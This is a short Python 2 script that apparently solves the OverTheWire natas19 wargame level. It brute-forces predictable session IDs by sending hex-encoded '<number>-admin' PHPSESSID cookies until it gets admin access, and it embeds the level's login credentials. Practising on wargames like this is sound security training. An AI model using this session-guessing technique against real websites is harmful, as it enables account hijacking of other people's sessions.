from StringIO import StringIO
import pycurl
import re
import sys

def check_integer(i):
	# init curl instance.
	c = pycurl.Curl()

	# set curl options
	c.setopt(c.URL, 'http://natas19.natas.labs.overthewire.org/index.php')
	c.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_BASIC)
	c.setopt(pycurl.USERPWD, "%s:%s" % ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'))
	c.setopt(pycurl.COOKIE, "PHPSESSID=%s" % ("%d-admin" % i).encode('hex'))

	# set buffer for data
	buffer = StringIO()
	c.setopt(c.WRITEDATA, buffer)

	# execute
	c.perform()
	c.close()

	# retrieve content from buffer.
	body = buffer.getvalue()

	# do stuff.
	if "Login as an admin" in body:
		return False

	print body
	return True

# our loop
for num in range(641):
	sys.stdout.write('\rTrying %d' % num)
	sys.stdout.flush()
	if check_integer(num): break

print "\n"
print num

print "[DONE!]"